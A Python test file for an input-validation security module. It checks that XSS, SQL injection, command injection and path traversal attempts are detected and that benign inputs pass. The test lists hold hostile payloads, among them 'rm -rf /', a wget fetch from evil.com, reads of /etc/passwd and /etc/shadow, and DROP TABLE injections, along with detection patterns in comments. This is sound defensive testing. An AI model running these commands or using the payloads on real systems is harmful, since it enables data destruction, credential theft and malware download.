"""Comprehensive tests for security input validation functionality.

This module provides comprehensive test coverage for input validation security
with focus on edge cases, attack patterns, and defensive programming.
"""

from hypothesis import given
from hypothesis import strategies as st
from src.security.input_validator import (
    InputValidator,
    ThreatType,
    ValidationResult,
)


class TestInputValidatorCore:
    """Test core input validation functionality."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.validator = InputValidator()

    def test_validator_initialization(self) -> None:
        """Test validator initializes correctly."""
        assert self.validator is not None
        assert hasattr(self.validator, "validate_sql_input")
        assert hasattr(self.validator, "validate_html_input")
        assert hasattr(self.validator, "validate_command_input")
        assert hasattr(self.validator, "validate_file_path")

    def test_empty_input_validation(self) -> None:
        """Test validation of empty inputs."""
        result = self.validator.validate_sql_input("")
        assert isinstance(result, ValidationResult)
        assert result.is_safe

    def test_basic_string_validation(self) -> None:
        """Test validation of basic strings."""
        result = self.validator.validate_sql_input("test")
        assert isinstance(result, ValidationResult)
        assert result.is_safe

    def test_long_input_validation(self) -> None:
        """Test validation of very long inputs."""
        long_input = "x" * 10000
        result = self.validator.validate_sql_input(long_input)
        assert isinstance(result, ValidationResult)


class TestSecurityPatterns:
    """Test security pattern detection and prevention."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.validator = InputValidator()

    def test_script_injection_detection(self) -> None:
        """Test detection of script injection attempts."""
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "<SCRIPT>alert('xss')</SCRIPT>",
            "<script src='evil.js'></script>",
            "javascript:alert('xss')",
            "JAVASCRIPT:alert('xss')",
        ]

        for dangerous_input in dangerous_inputs:
            result = self.validator.validate_html_input(dangerous_input)
            # Should detect and reject dangerous patterns
            assert not result.is_safe, f"Failed to detect: {dangerous_input}"
            assert result.detected_threats is not None
            assert ThreatType.XSS_INJECTION in result.detected_threats

    def test_sql_injection_detection(self) -> None:
        """Test detection of SQL injection attempts."""
        sql_injections = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'; --",
            "1' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        ]

        for injection in sql_injections:
            result = self.validator.validate_sql_input(injection)
            # Should detect SQL injection patterns
            assert not result.is_safe, f"Failed to detect SQL injection: {injection}"
            assert result.detected_threats is not None
            assert ThreatType.SQL_INJECTION in result.detected_threats

    def test_command_injection_detection(self) -> None:
        """Test detection of command injection attempts."""
        command_injections = [
            "; rm -rf /",  # Should match `;\\s*(rm|del|format|mkfs)`
            "&& wget evil.com/malware",  # Should match `&&|\\|\\|`
            "`rm -rf /`",  # Should match `` `.*` ``
            "$(rm -rf /)",  # Should match `\\$\\(.*\\)`
            "; cat /etc/passwd",  # Should match `;\\s*cat\\s+/etc/passwd`
        ]

        for injection in command_injections:
            result = self.validator.validate_command_input(injection)
            # Should detect command injection patterns
            assert not result.is_safe, (
                f"Failed to detect command injection: {injection}"
            )
            assert result.detected_threats is not None
            assert ThreatType.COMMAND_INJECTION in result.detected_threats

    def test_path_traversal_detection(self) -> None:
        """Test detection of path traversal attempts."""
        path_traversals = [
            "../etc/passwd",  # Should match `\\.\\.\\./` and `/etc/passwd`
            "..\\windows\\system32",  # Should match `\\.\\.\\\\` and `windows/system32`
            "/etc/passwd",  # Should match `/etc/passwd`
            "/etc/shadow",  # Should match `/etc/shadow`
            "windows/system32",  # Should match `windows/system32`
        ]

        for traversal in path_traversals:
            result = self.validator.validate_file_path(traversal)
            # Should detect path traversal patterns
            assert not result.is_safe, f"Failed to detect path traversal: {traversal}"
            assert result.detected_threats is not None
            assert ThreatType.PATH_TRAVERSAL in result.detected_threats


class TestValidationMethods:
    """Test different validation methods."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.validator = InputValidator()

    def test_html_validation_safe_input(self) -> None:
        """Test HTML validation with safe inputs."""
        safe_inputs = [
            "hello world",
            "test@example.com",
            "https://example.com",
            "normal text with spaces",
        ]

        for test_input in safe_inputs:
            result = self.validator.validate_html_input(test_input)
            assert isinstance(result, ValidationResult)
            assert result.is_safe, f"Safe input flagged as dangerous: {test_input}"

    def test_sql_validation_safe_input(self) -> None:
        """Test SQL validation with safe inputs."""
        safe_inputs = [
            "user123",
            "test@example.com",
            "normal text",
            "1234567890",
        ]

        for test_input in safe_inputs:
            result = self.validator.validate_sql_input(test_input)
            assert isinstance(result, ValidationResult)
            assert result.is_safe, f"Safe input flagged as dangerous: {test_input}"

    def test_command_validation_safe_input(self) -> None:
        """Test command validation with safe inputs."""
        safe_inputs = [
            "filename.txt",
            "user_input",
            "normal text",
            "data123",
        ]

        for test_input in safe_inputs:
            result = self.validator.validate_command_input(test_input)
            assert isinstance(result, ValidationResult)
            assert result.is_safe, f"Safe input flagged as dangerous: {test_input}"

    def test_file_path_validation_safe_input(self) -> None:
        """Test file path validation with safe inputs."""
        safe_paths = [
            "/home/user/document.txt",
            "C:\\Users\\user\\document.txt",
            "relative/path/file.txt",
            "file.txt",
        ]

        for test_path in safe_paths:
            result = self.validator.validate_file_path(test_path)
            assert isinstance(result, ValidationResult)
            # Note: Some of these might be flagged depending on validation rules


class TestPropertyBasedValidation:
    """Property-based tests for input validation."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.validator = InputValidator()

    @given(st.text(min_size=0, max_size=100))
    def test_sql_validation_always_returns_result(self, text_input: str) -> None:
        """Property: SQL validation always returns a ValidationResult."""
        result = self.validator.validate_sql_input(text_input)
        assert isinstance(result, ValidationResult)
        assert hasattr(result, "is_safe")
        assert hasattr(result, "detected_threats")

    @given(st.text(min_size=0, max_size=100))
    def test_html_validation_always_returns_result(self, text_input: str) -> None:
        """Property: HTML validation always returns a ValidationResult."""
        result = self.validator.validate_html_input(text_input)
        assert isinstance(result, ValidationResult)
        assert hasattr(result, "is_safe")
        assert hasattr(result, "detected_threats")

    @given(
        st.text(min_size=0, max_size=50).filter(
            lambda x: not any(c in x for c in ["<", ">", ";", "|", "&", "`", "$"])
        )
    )
    def test_safe_input_validation(self, safe_input: str) -> None:
        """Property: Safe inputs should not cause exceptions."""
        # Test with inputs filtered to be likely safe
        result = self.validator.validate_sql_input(safe_input)
        assert isinstance(result, ValidationResult)

        result = self.validator.validate_html_input(safe_input)
        assert isinstance(result, ValidationResult)


class TestErrorHandling:
    """Test error handling and edge cases."""

    def setup_method(self) -> None:
        """Set up test fixtures."""
        self.validator = InputValidator()

    def test_malformed_input_handling(self) -> None:
        """Test handling of malformed inputs."""
        malformed_inputs = [
            "\x00\x01\x02",  # Binary data
            "\r\n\r\n",  # Line endings
            "\t\t\t",  # Tabs
        ]

        for malformed_input in malformed_inputs:
            # Should handle gracefully, not crash
            result = self.validator.validate_sql_input(malformed_input)
            assert isinstance(result, ValidationResult)

            result = self.validator.validate_html_input(malformed_input)
            assert isinstance(result, ValidationResult)

    def test_sanitization_results(self) -> None:
        """Test that sanitized results are provided."""
        dangerous_sql = "'; DROP TABLE users; --"
        result = self.validator.validate_sql_input(dangerous_sql)

        assert isinstance(result, ValidationResult)
        assert not result.is_safe
        assert len(result.sanitized_input) > 0  # Should provide sanitized version

    def test_threat_descriptions(self) -> None:
        """Test that threat descriptions are provided."""
        dangerous_html = "<script>alert('xss')</script>"
        result = self.validator.validate_html_input(dangerous_html)

        assert isinstance(result, ValidationResult)
        assert not result.is_safe
        assert len(result.threat_description) > 0  # Should describe the threat

    def test_confidence_scoring(self) -> None:
        """Test confidence scoring in results."""
        safe_input = "hello world"
        result = self.validator.validate_sql_input(safe_input)

        assert isinstance(result, ValidationResult)
        assert hasattr(result, "confidence_score")
        assert isinstance(result.confidence_score, float)

    def test_edge_case_inputs(self) -> None:
        """Test edge case inputs."""
        edge_cases = [
            "",  # Empty string
            " ",  # Single space
            "a" * 1000,  # Very long string
            "normal text",  # Normal input
        ]

        for edge_case in edge_cases:
            result = self.validator.validate_sql_input(edge_case)
            assert isinstance(result, ValidationResult)

            result = self.validator.validate_html_input(edge_case)
            assert isinstance(result, ValidationResult)

            result = self.validator.validate_command_input(edge_case)
            assert isinstance(result, ValidationResult)

            result = self.validator.validate_file_path(edge_case)
            assert isinstance(result, ValidationResult)
